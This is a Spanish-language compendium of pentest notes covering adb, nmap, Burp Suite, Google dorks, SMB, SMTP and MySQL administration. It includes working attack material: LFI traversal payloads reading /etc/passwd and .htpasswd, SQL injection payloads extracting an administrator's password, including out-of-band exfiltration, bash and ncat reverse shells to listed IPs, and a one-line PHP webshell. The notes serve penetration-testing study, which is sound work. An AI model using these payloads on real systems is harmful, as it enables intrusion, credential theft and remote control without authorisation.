# Pentest
Un compendio de notas sobre pentest.

************************************************************************************************
# Análisis de binarios
## 32 bits vs 64 bits

Se abre el binario con un visor hexadecimal y se busca lo siguiente:

Si es de 32 bits
+ PL
+ 50 45 00 00 4C

Si es de 64 bits
+ PE..dt
+ 50 45 00 00 64 86

************************************************************************************************
# Android
## Herramientas utiles
+ Genymotion
+ Android Studio

## adb

Puertos default:
+ 
+ 

Comandos útiles
~~~bash
# Mostrar menú de la herramienta
adb

# Conectarte a un dispositivo mediante adb
adb connect 172.27.253.6:5555

# Listar dispositivos
adb devices

# Instalar en aplicación en emulador
adb -s <emulator> install <application.apk>

# Reemplaza la copia existente de la aplicación
adb -s <emulator> install -r <application.apk>

# Ingresa a una shell de un device
adb -s <emulator> shell

# Envía un documento a un emulador
adb -s <emulator> push '/home/user/local/file' '/data/local/' 

# Descarga un documento desde un emulador
adb -s pull 'sdcard/log.txt' '/home/user/local/file'

~~~

## Genymotion
~~~
### You can now use these tools from [/opt/genymobile/genymotion]:
- genymotion
- genymotion-shell
- gmtool

### /opt/genymobile/genymotion/tools
~~~

************************************************************************************************
# Apache

## Obtener versiones
+ curl
+ netcat
+ telnet

~~~bash
curl -I http://google.com

~~~


## Enumerar carpetas (dirb)
+ dirb
+ gobuster
+ nmap

~~~bash
# Enumerar carpetas con dirb
dirb http://sitio.com -o output_file.txt

# Enumerar carpetas con nmap
nmap -P0 -p80 --script http-enum 127.0.0.1
~~~

## Dirbfile
~~~bash
# clonar repositorio
git clone https://github.com/elcaza/dirbfile.git

# Uso
./dirbfile file
~~~

************************************************************************************************
# BurpSuite

## Repeater
A través de esta herramienta se puede probar el reenvío de peticiones
+ Probar headers
+ Parámetros, desde su cambio y la ausencia del parámetro 

## Intruder
A través de esta herramienta se pueden automatizar una serie de ataques
+ Null payloads
    + Puede mostrar comportamientos anómalos en el sistema
    + Por ejemplo: En un sistema de compras, al añadir items de manera indefinida en algún punto puede pasar de "Totales" en números positivos a números negativos
+ Character Blocks
    + Puede mostrar comportamientos anómalos en el sistema
    + Por ejemplo: En un sistema de registro de correo electrónico, podría llenar todo el tamaño de una cadena.

## Target
+ Site Map - engagement tools - Search
+ Site Map - engagement tools - Find Comments
+ Site Map - engagement tools - Find Scripts
+ Site Map - engagement tools - Find References
+ Site Map - engagement tools - Analize Target
+ Site Map - engagement tools - Discovery Content
+ Site Map - engagement tools - Scheluded task
+ Site Map - engagement tools - Simulate Manual Testing

## Extensiones
### Hackvector
+ Extensions > Hackvertor > Encode > hex_entities
+ Extension: Content-Type-Converter

************************************************************************************************
# Envío de información
## Vía POST

**BASH**
~~~bash
curl --header "Content-Type: application/json" \
    --request POST \
    --data '{"username":"xyz","password":"xyz"}' \
    http://localhost:3000/
~~~

Más información
+ https://linuxize.com/post/curl-post-request/


## Vía GET
**BASH**
<!--
~~~bash
GET_USER="user"
GET_PASS="pass"
URL=""
curl https://reqbin.com/
~~~
-->

************************************************************************************************
# Exfiltración de información
## Linux

### Archivos importantes
+ /etc/passwd
+ /etc/shadow
+ /etc/resolv.conf
+ /etc/hosts
+ /etc/hostname

### Comprimir información 
~~~bash
# Respaldo omitiendo erroes, tipos de archivos y carpetas
tar --warning=no-file-changed --exclude={*.mp4,*.mp3,'./public_html'} --ignore-failed-read -zcvf respaldo.tar.gz .
~~~

### Conseguir información
~~~bash

~~~

************************************************************************************************
# Google Dorks
## Buscadores
+ Google
+ Duckduckgo
+ bing
~~~bash
# inurl
inurl:view/view.shtml
inurl:/cgi-bin/guestimage.html
inurl:"/owa/auth/logon.asp"

# intitle
intitle:"index of /"
intitle:"Nessus Scan Report"
intitle:"index of /" "Microsfot-ISS/6.0"
intitle:"index of /" “Microsfot-ISS/5.0”

# filetype
filetype:txt
filetype:sql
filetype:xlsx
filetype:md

# Concatenando (Bloqueado desde google, pero vigente en duckduckgo y bing)
site:* filetype:xlsx

# link (-site:sitioexcluido)
link:www.sitioejemplo.com -site:sitioejemplo.com
link:www.sitioejemplo.com -site:sitioejemplo.com -site:sitioejemploespana.com -site:sitioejemplomexico.com

# Password
filetype:inc intext:mysql_connect password -please -could

# Obtener información de un sitio
info:site.com

# Ver si está habilitada la indexación de carpetas
intitle:"index of" site:site.com

# Ver información del conusuario.servidorto de whois
whois site.com
~~~

## Bing
~~~bash
# contains
# Los resultados esperados están dentro de un CMS programado en el lenguaje que se indique
contains:php filetype.pdf

# ip medio parchado, pero se puede evadir vía url
# https://www.bing.com/search?q=IP:108.167.137.42
IP:108.167.137.42
~~~

************************************************************************************************
# Hashes
## Información de hashesh
* https://rhash.sourceforge.net/hashes.php#:~:text=The%2032%2Dbit%20long%20hash,in%20the%20EDonkey%20p2p%20network.


************************************************************************************************
# Herramientas útiles

## CRACKMAPEXEC

~~~bash
# Enumerar dominio
crackmapexec smb 10.10.10.10

# Comprobar contraseñas
crackmapexec smb 10.10.10.10 -u 'user' -p 'password'

# Ver recursos compartidos
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --shares
~~~

## Cyberchef
Un montón de herramientas para códificar/decodificar
+ https://gchq.github.io/CyberChef/

## smbmap
~~~bash
# Ver recursos compartidos
smbmap -H 10.10.10.10

# Leer algún recurso compartido (preivamente sale)
smbmap -H 10.10.10.10 -r Nombre_recurso

# Descargar un recurso
smbmap -H 10.10.10.10 --download Nombre_recurso

# Leer carpetas/archivos con credenciales
smbmap 10.10.10.10 -u 'user' -p 'password' -r Carpeta
~~~

## eyewitness
~~~bash
git clone https://github.com/RedSiege/EyeWitness.git

cat ips_all.txt | (while read hostname; do cat puertos_unicos.txt | (while read PORT; do echo $hostname:$PORT; done); done) > eyewitness.txt
~~~
+ https://github.com/RedSiege/EyeWitness

## whois
~~~bash
sudo apt install whois

cat ../ips.txt | (while read ip; do whois $ip | tee $(date +%d-%m-%Y)_$ip; done)

~~~

## Ngrok
+ https://ngrok.com/

## Passwords
~~~bash
cat passwords_burp.txt | (while read password; do echo -n "carlos" | (while read USERS; do echo $USERS:$password; done); done) > eyewitness.txt
~~~

## Ver tu IP pública
~~~
curl ifconfig.me
~~~

## Webhook
Para recibir emails y peticiones sin una IP pública
+ https://webhook.site

************************************************************************************************
# Kioscos Windows

## Comandos útiles
~~~bash
# usuario local
whoami

# hostname
hostname

# version de windows
winver

# Visor de eventos
eventvwr
~~~

************************************************************************************************
# LDAP

## ?
~~~bash
ldapsearch -h 192.168.100.1 -x -s base namingcontexts
~~~
+ https://bmaupin.github.io/wiki/applications/misc/ldapsearch.html

************************************************************************************************
# LFI (Local File Inclusion)

## ?
~~~bash
# añadir parametros una busqueda para generar errores nos muestra recursos que podrían ser de utilidad
http://172.16.22.14/index.html?page=blog&id=coso
    # Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20
~~~

## Escapar la concatenación con extensión

```bash
# Si la página concatena (nombre + .php)
http://172.16.22.14/index.html?page=blog

# Esto buscaría passwd.php
http://172.16.22.14/index.html?page=../../../../etc/passwd

# Para evitarlo usar el terminador de cadena de C (%00)
http://172.16.22.14/index.html?page=../../../../etc/passwd%00

# Sacando los usuarios que serán de interes debido a sus privilegios
http://172.16.22.14/index.html?page=../../../../etc/groups%00


http://172.16.22.14/index.html?page=../../../../../etc/group%00
    # users:x:100:usuario1,usuario2,usuario3,admin
    # admins:x:507:usuario1,admin

# Anexo: Lo que pasa en c:
    # char cadena[30] = "Hola mundo";
    # char cadena2[30] = "hola mun\0do";
    # puts(cadena); // Hola mundo
    # puts(cadena2); // Hola mun
```

## Sitios con configuraciones .htaccess
Tomando como base:
+ http://172.16.22.14/index.html?page=blog (Sitio con LFI)
+ http://172.16.22.14/restringido (Este pide autenticación DIGEST o BASIC)

Inferimos que tenemos dos sitios:
+ /var/www/html/sitioweb
+ /var/www/html/restringido

Por lo que podemos:
~~~bash
# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htaccess%00
# /var/www/html/sitioweb/..restringido/.htaccess
    # AuthType Basic
    # AuthName "Restricted - authentication required"
# Aquí incluimos la ruta de los password hasheados
    # AuthUserFile /var/www/html/restringido/.htpasswd 
    # Require valid-user

# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htpasswd%00
    # user1:mHjBL6MLRc3nQ
    # user2:OkNYEpU0yapIs
    # admin:vjX9YIkiN3RL6
~~~

El hasheo es de 13 caracteres
+ vjX9YIkiN3RL6
+ DES 13 chars 


************************************************************************************************
# Linux

## Administración básica
~~~bash
# Crear un grupo
groupadd grupo

# Crear usuarios
    # adduser => Script
    # useradd => Manual

useradd -ms /bin/bash superadmin
# -m Crea carpeta home
# -s Asigna shell

# Añadir un usuario a grupo
usermod -a -G sudo soporte

# Cambia password
passwd superadmin

# Variable path
export PATH=$PATH:/new_route
export PATH=new_route:$PATH

## Agregamos contraseña al usuario appuser
RUN echo 'user:password' | chpasswd

~~~

### Información del sistema
~~~bash
# Check system version
lsb_release -a
cat /etc/issue
cat /etc/os-release
hostnamectl
~~~

### Teclado
~~~bash
# 1) Configurar teclado
dpkg-reconfigure keyboard-configuration

# 2) Aplicar la configuración del teclado (solo funciona para esa sesión)
setupcon

# 3) Para un cambio permantente
dpkg-reconfigure console-setup
~~~

## Descargar archivos

### wget

~~~bash
# Descarga un archivo
wget <URL>

# Descarga y renombra un archivo
wget -O <filename> <URL>

# Descarga varios archivos desde un archivo de texto con las urls
wget -i download_files.txt

# Descarga una carpeta
wget -r ftp://server-address.com/directory

# Descargar de manera recursiva esos elementos
wget -nd -r -A pdf,doc,docx,xls,xlsx,jpg www.rediris.es
~~~

### curl

~~~bash
# Descarga un archivo
curl -O URL
curl -O URL1 URL2 URL3

# Descarga y renombra un archivo
curl -o filename URL
~~~


************************************************************************************************
# Metasploit
## Logs
Problema:
+ La salida de los comandos en metasploit nos es procesable con << |  >>
    + Por ejemplo la salida de enum_ssh para filtrar únicamente los usuarios validos

Con spool puedes definir un lugar en que se guardarán todo lo que imprima en pantalla metasploit

~~~bash
# Apagar los logs
spool off

# Añadir una ruta en que se harán los logs
spool /ruta/para/guardar.log

# Si lo quieres tener por siempre 
spool /home/<username>/.msf3/logs/console.log
~~~

Más información:
+ https://blog.rapid7.com/2011/06/25/metasploit-framework-console-output-spooling/


************************************************************************************************
# nmap

## Metodología

~~~bash
simple (nmap 2000-10000)
    1. simple
        nmap -vvv -Pn --max-retries 1 --top-ports 10000 -iL ips.txt -oA s1_proyecto_10000 
        correr: script para sacar puertos únicos
    2. simple de versiones
        nmap -vvv -sV -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s2_sv_proyecto_10000
    3. simple de vulnes
        nmap -vvv -sV -sC -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s3_sv_sc_proyecto_10000 
        correr: script para remover puertos filtrados

completo (all)
    1. completo
        nmap -vvv -Pn --max-retries 1 -p- -iL ips.txt -oA c1_proyecto_all 
        correr: script para sacar puertos únicos
    2. completo de versiones
        nmap -vvv -sV -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA c2_sv_proyecto_all
    3. completo de vulnes
        nmap -vvv -sV -sC -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA c3_sv_sc_proyecto_10000 

script para sacar puertos únicos
    cat file.nmap  | grep open | cut -d "/" -f1 | sort -u | tr "\n" "," && echo;

script para remover puertos filtrados
    sed '/filtered/d' c2_sv_sc_proyecto_all.nmap  > f2_sv_sc_proyecto_all.nmap
    sed '/filtered/d' c3_sv_sc_proyecto_all.nmap  > f3_sv_sc_proyecto_all.nmap

UDP
    1. simple
        nmap -vvv -sU -Pn --max-retries 1 --top-ports 10000 -iL ips.txt -oA s1_udp_proyecto_10000 
    2. simple de versiones
        nmap -vvv -sU -sV -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s2_udp_sv_proyecto_10000
    3. simple de vulnes
        nmap -vvv -sU -sV -sC -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s3_udp_sv_sc_proyecto_10000 


otros
    cat f2_sv_proyecto_all.nmap | grep open | sort -u
~~~

## Secuencia

1. Corroborar que el host esté arriba, considerar omitir la resolución DNS
    + Puede ser con o sin ping
2. Detección única de puertos (Sin versiones ni nada)
3. Detección de versiones y vulnerabilidades 

## Escaneo de un segmento de red
~~~bash
# Escanear un segmento de red
nmap -sn 172.27.48.0/24

# Escanear un segmento de red (varias ips)
nmap -sn 172.27.253.0/24 172.27.252.0/29
~~~

## Descubrimiento rápido
~~~bash
# Escaneo a top ports
nmap --max-retries 0 --top-ports 5000 site.com 
# Escaneo a todos los puertos
nmap --max-retries 0 -p- site.com
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -P0 site.com 
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -Pn site.com 
~~~

## Detección de versiones y vulnerabilidades
~~~bash
# Sintaxis básica
nmap --max-retries -p 22,80,443,3000 -sV

# -sV => Mostrar versiones
# -O => Identifica S.O.
# -p => Define el puerto

# Identifica vulnerabilidades
nmap -sV -p80,443 --script=vulners ip

# Identifica vulnerabilidades por puerto asociado
nmap -p80,8080 –sV –sC ip
# -sC => Scripts de vulnerabilidades acorde al puerto analizado

# Busca vulnerabilidades
nmap 192.160.100.1 -Pn -sCV

# Realizar escaneo completo a los puertos determinados
nmap -A -p80,443 ip
~~~

## Escaneo UDP
~~~bash
# Escaneo a puertos UDP
nmap -sU 172.24.16.25
~~~

## Scripts

~~~bash
# Actualiza la BD de scripts
nmap --script-updatedb

# Localiza los scripts de nmap
locate nse | grep script

# Ayuda sobre el script
nmap --script-help=nombre_scrip
~~~

Más información:
+ https://linuxhint.com/stealth_scans_nmap/

************************************************************************************************
# Pretty shell

## rlwrap (Historial de comandos)
~~~bash
# Instala rlwrap
sudo apt install rlwrap

# Para capturar la reverse shell
rlwrap nc -lp 5000
~~~

## Python pretty shell
~~~bash
# Una vez que tienes la conexión
python -c "import pty; pty.spawn('/bin/bash')"

# Otra opción es
python -c "import pty; pty.spawn('/bin/sh')"
~~~



************************************************************************************************
# Python
## Servidores web

~~~python
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 7777
~~~
# SQL

## Asignar permisos
~~~bash
GRANT ALL PRIVILEGES ON mi_base_de_datos.* TO mi_usuario@localhost;
FLUSH PRIVILEGES;
~~~

## Borrar base de datos
~~~bash
DROP DATABASE base_de_datos;
~~~

## Cambiar password de usuarios sin conocer el password
~~~bash
# Ver versión mysql/mariadb
mysql --version

# Detener mysql
sudo systemctl stop mysql

# Iniciar MySQL sin seguridad
sudo mysqld_safe --skip-grant-tables --skip-networking &

# Iniciar sesión sin contraseña
mysql -u root

# Cambiar password 
FLUSH PRIVILEGES;
ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password';

# Otra opción
SET PASSWORD FOR 'root'@'localhost' = PASSWORD('new_password');
~~~

## Ingresar a SQL
~~~bash
sudo mysql -p
~~~

## Listar usuarios
~~~bash
# Listar usuarios en MySQL
SELECT user FROM mysql.user;

# Listar usuarios y hosts
SELECT user,host FROM mysql.user;

# Listar usuarios, hosts y password
SELECT user,host,password FROM mysql.user;

# Show Current and Current Logged Users
SELECT current_user();

# If you need more information, you can modify the query to display currently logged-in users with their states
SELECT user,host, command FROM information_schema.processlist;

~~~

## Listar Bases de datos y ver permisos
~~~bash
# Ver bases de datos
SHOW DATABASES;
SHOW SCHEMAS;
~~~

## Listar permisos
~~~bash
# Ver permisos de una BD en especifico
SELECT user,host from mysql.db where db='DB_NAME';

# Ver privilegios de todos los usuarios
SELECT user, host, password, select_priv, insert_priv, shutdown_priv, grant_priv FROM mysql.user;

# Ver permisos para BD individuales
SELECT user, host, db, select_priv, insert_priv, grant_priv FROM mysql.db;

# Ver privilegios
SHOW grants;
~~~

## Respaldar una BD
~~~bash
# Crear respaldo de la BD
mysqldump -u nombre_usuario -p nombre_bbdd > nombre_archivo_dump.sql
~~~

## Importar una BD
~~~bash
# Crear una nueva base de datos
CREATE DATABASE nueva_bbdd;

# Importar una BD
mysql -u nombre_usuario -p nueva_bbdd < nombre_archivo_dump.sql;
~~~

## Referencias:
+ https://www.hostinger.com/tutorials/mysql-show-users/#:~:text=2.-,Use%20the%20MySQL%20SHOW%20USERS%20Query,have%20been%20created%20in%20MySQL.
+ https://www.digitalocean.com/community/tutorials/how-to-reset-your-mysql-or-mariadb-root-password


# SQL Injection

## Database version
~~~sql
-- Oracle
SELECT banner FROM v$version
SELECT version FROM v$instance
-- Microsoft
SELECT @@version
-- PostgreSQL
SELECT version()
-- MySQL
SELECT @@version
~~~

## Notas generales
~~~sql
-- Notas importantes
LIMIT 1 -- Trunca el resultado tras la primer coincidencia
WHERE ROWNUM = 1 -- Trunca el resultado tras la primer ORACLE

LENGTH(password) -- Longitud de la variable

SUBSTRING(password,1,1) -- (variable,posicion,cantidad_letras_a_extraer)
    -- hola
    SUBSTRING(password,1,1) -- h
    SUBSTRING(password,2,1) -- o
    SUBSTRING(password,2,3) -- ola

CAST((SELECT example_column FROM example_table) AS int) 
    -- ERROR: invalid input syntax for type integer: "Example data"
~~~

## Exfiltrado de información
~~~sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

SELECT YOUR_COLUMN_NAME||'~'||YOUR_COLUMN_NAME FROM YOUR_TABLE_NAME
~~~

## Basado en errores

### Ejemplo CAST
~~~sql
-- Obteniendo errores
' AND CAST((SELECT 1) AS int)-- c
'-- Obteniendo errores
' AND 1=CAST((SELECT 1) AS int)-- c

'-- Obtiene el primer <username> de la tabla <users> # Observar si la cadena de error se "trunca" debido al limite de caracteres
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- c

'-- Obtiene el primer <password> de la tabla <users> # Observar si la cadena de error se "trunca" debido al limite de caracteres
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- c
~~~

## Blind
### Ejemplo cookies
~~~sql
-- Conocer si hay una tabla llamada <users>
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a' -- c

'-- Conocer si existe el usuario <administrator> en la tabla <users>
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a' -- c

'-- Conocer la longitud del <password> del usuario <administrator> en la tabla <users>
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>0)='a' -- c

'-- Conocer la letra de la primera posicion del <password> longitud del <password> del usuario <administrator> en la tabla <users>
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' -- c

'-- Automatizacion con ClusterBomb e Intruder
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' -- c
~~~

### Ejemplo CASE
~~~sql
-- Conocer si hay una tabla llamada <users>
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' -- c

-- Conocer si existe el usuario <administrator> en la tabla <users>
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c

-- Conocer la longitud del <password> del usuario <administrator> en la tabla <users> # 200 ok in response
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c

-- Conocer la longitud del <password> del usuario <administrator> en la tabla <users> # 200 ok in response
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c

-- Automatizacion con ClusterBomb en Burp Proxy Intruder # 500 error in response
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- c
~~~

### Ejemplo TIME
~~~sql
'-- Comprobamos si existe un delay
'; SELECT pg_sleep(3) -- c
'-- Comprobamos si existe un delay en sentencias CASE
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END -- c

'-- Conocer si existe el usuario <administrator> en la tabla <users>
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator' -- c

'-- Conocer si existe un campo password mayor a 0 del usuario <administrator> en la tabla <users> # sleep 3s
'; SELECT CASE WHEN LENGTH(password)>0 THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator' -- c

'-- Automatizacion con ClusterBomb en Burp Proxy Intruder # 500 error in response
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(3) ELSE '' END FROM users WHERE username='administrator')||' -- c
~~~

### Ejemplo out-of-band interaction
~~~sql
-- Posibles payloads
-- Oracle
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')

-- Microsoft
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'

-- PostgreSQL
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

-- MySQL
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

-- Posibles implementaciones a partir de
'||(SELECT '') -- c
'||(SELECT '' FROM dual) -- c

-- Exfiltrado de información
propia
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.{domain}/"> %remote;]>'),'/l') FROM dual) -- c

~~~

### Otros
~~~sql
SQL injection with filter bypass via XML encoding
+  Extensions > Hackvertor > Encode > hex_entities
~~~

## Más información
+ https://portswigger.net/web-security/sql-injection/cheat-sheet

************************************************************************************************
# Reverse Shell & Webshell
## Linux

### Reverse shell con bash
~~~bash
# En la máquina del ausuario.servidorante
nc -lp 9999

# En la máquina de la victima
# Cambiar IP & PORT
# bash -i >& /dev/tcp/IP/PORT 0>&1
bash -i >& /dev/tcp/172.16.16.10/9999 0>&1
bash -i >& /dev/tcp/127.0.0.1/5000 0>&1
~~~

### Reverse shell con Netcat
~~~bash
# Requiere ncat
sudo apt install ncat

# En la máquina del ausuario.servidorante
ncat -lp 1234

# En la máquina de la victima
# Requiere: apt install ncat (Especificamente este paquete para la opción -e)
# Cambiar IP & PORT
# nc -e /bin/sh IP PORT
ncat -e /bin/sh 10.0.0.1 1234
~~~

+ Puedes encontrar shells más complejas en la carpeta [reverse-shells](./reverse-shells/)

### Webshells

#### PHP POST param
~~~php
# archivo.php
<?=`$_POST[0]`?>

# Uso
curl http://localhost/ruta/archivo.php -d "0=whoami"
~~~

#### P0wny-shell
+ https://github.com/flozz/p0wny-shell/blob/master/shell.php

************************************************************************************************
# RPC (135)

## Script de Python
+ https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py

~~~bash
./rpcdump.py 192.168.100.1
~~~

************************************************************************************************
# Secure Headers

## shcheck
+ https://github.com/santoru/shcheck

~~~bash
# Descarga
git clone https://github.com/santoru/shcheck.git

./shcheck.py https://site.com
~~~

## shcheckfile

~~~bash
# Requerimientos
git clone https://github.com/santoru/shcheck && cd shcheck
sudo cp shcheck.py /usr/local/bin/

# Descarga de la herramienta
git clone https://github.com/elcaza/shcheckfile.git
cd shcheckfile
./shcheckfile file.txt

~~~

************************************************************************************************
# SMB (Server Message Block)

## Detalles
+ Puerto 445
+ Versión SMB 1.0 => Conexión anónima permitida
+ Windows 2008 en adelante no hay conexión anónima
    + La versión SMB 1.0 podría estar habilitada por compatibilidad

## Autenticación
~~~bash
# Autenticación anónima
smbclient -L 172.27.30.30 -N
    # Caso deshabilitado
    # Anonymous login successful
    # 
    #         Sharename       Type      Comment
    #         ---------       ----      -------
    # SMB1 disabled -- no workgroup available


# Autenticación con usuario y contraseña
# % separa el usuario del password
smbclient -L 172.27.30.30 -U 'user%password'
    # Caso login correcto
    # Sharename       Type      Comment                                                                                                                                                                                                
    #    ---------       ----      -------                                                                                                                                                                                                

# Recursos compartidos por defecto   
    #    ADMIN$          Disk      Remote Admin                                                                                                                                                                                           
    #    C$              Disk      Default share                                                                                                                                                                                          
    #    IPC$            IPC       Remote IPC                                                                                                                                                                                             
    
    
    #    NETLOGON        Disk      Logon server share                                                                                                                                                                                     
    #    SYSVOL          Disk      Logon server share

# Recursos compartidos en el caso de usar Windows update                                                                                                                                                                           
    #    UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.                                                         
    #    WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.                                                                                                         
    #    WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.                                                                                                                          
        # SMB1 disabled -- no workgroup available   
~~~

## Entrada a los directorios
~~~bash
# Entrada a los directorios
# Para algunos casos se requiere usuario admin
smbclient //172.27.30.30/WsusContent -U 'user%password'

    # Caso usuario correcto y con privilgios suficientes
    # user:~# smbclient //172.27.30.30/C$ -U 'usuarioadmin%password'
    # Try "help" to get a list of possible commands.
# Una vez en el prompt (smb: \>) usar dir para listar
dir
    # $Recycle.Bin                      DHS        0  Thu Aug 22 11:50:45 2013
    # Documents and Settings            DHS        0  Thu Aug 22 10:48:41 2013
    # File.txt                              DR        0  Wed Sep  8 19:08:52 2021
    # Program Files                      DR        0  Wed Sep  8 20:30:07 2021
    # Program Files (x86)                 D        0  Thu Aug 22 11:39:32 2013
    # ProgramData                        DH        0  Wed Sep  8 19:11:24 2021
    # Users                              DR        0  Wed Sep  8 19:08:52 2021
    # Windows                             D        0  Wed Sep  8 18:52:38 2021

# Para obtener algun archivo get file
get File.txt
    # getting file \File.txt of size 0 as READMe.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

# Para quitar 
quit

#####################
    # Caso usuario correcto y con privilgios insuficientes
    # smbclient //172.27.30.30/WsusContent -U 'user%password'
    # tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

## Para deshabilitar el compartir por defecto mediante llave de registro 
~~~bash
# llave para deshabilitar el autoshare (?)
# dar de alta double word y en valor 0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\AutoShareWks
~~~

## SMB vulnes nmap
~~~bash
# SMB
nmap 192.168.100.1 -Pn -p 445 -sCV –script vuln
~~~

************************************************************************************************
# SMTP (Simple Mail Transfer Protocol)
Puedes conectarte a través de varias herramientas, por ejemplo:
- netcat
- telnet
## Sacar la configuración del servidor
Requiere que tengas el nombre de dominio, pero este sale en el banner de bienvenida
+ 220 dmzweb.sitio.com ESMTP Sendmail 8.13.5/8.13.5; Mon, 4 Oct 2021 03:20:03 -0400

~~~bash
# Con telnet
telnet 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit

# Con netcat
nc 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit
~~~

## Enumerar cuentas de usuarios
~~~bash
nc 172.27.254.20 25
# Nota el helo en lugar de ehlo
helo dmzweb.sitio.com 
# Para enumerar se uso EXPN username
EXPN usuario1
    # Output
    # 550 5.1.1 usuario1... User unknown
EXPN root
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
EXPN webmaster
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
~~~

## Enviar correos sin autenticación
Tienes que tener una cuenta valida de correo
~~~bash
EXPN root
    # 250 2.1.5 Nombre ap <usuario.servidor@dmzweb.sitio.com>
mail from: usuario.servidor@dmzweb.sitio.com
    # 250 2.1.0 usuario.servidor@dmzweb.sitio.com... Sender ok
rcpt to: user@gmail.com
    # 250 2.1.5 user@gmail.com... Recipient ok
data
    # 354 Enter mail, end with "." on a line by itself
Subject: El asunto
Mensaje del email, terminando con un punto
.
# 250 2.0.0 1947Mnyw018712 Message accepted for delivery

~~~

************************************************************************************************
# SQL Injection
## Mediante URL


## Mediante parámetros



************************************************************************************************
# SSL
## Herramientas

Desde la web
+ https://www.ssllabs.com/ssltest/analyze.html

ssl scan
+ https://github.com/rbsec/sslscan

testssl
+ https://github.com/drwetter/testssl.sh

Guía de cifrados seguros e inseguros
+ https://ciphersuite.info/cs/?security=all&software=openssl&singlepage=true

## TestSSL from file
~~~bash
# Descargar testssl
git clone --depth 1 https://github.com/drwetter/testssl.sh.git --branch 3.0

# Análisis de varios sitios con output en HTML
./testssl.sh --html --file sitios.txt
~~~

************************************************************************************************
# Tareas en segundo plano y asincronas

## Con funciones
~~~bash
#!/usr/bin/bash
delayed_curl() {
	url=$1
	callback=$2
	seconds=$3

	sleep $seconds
	curl -s $url || $callback $url
}

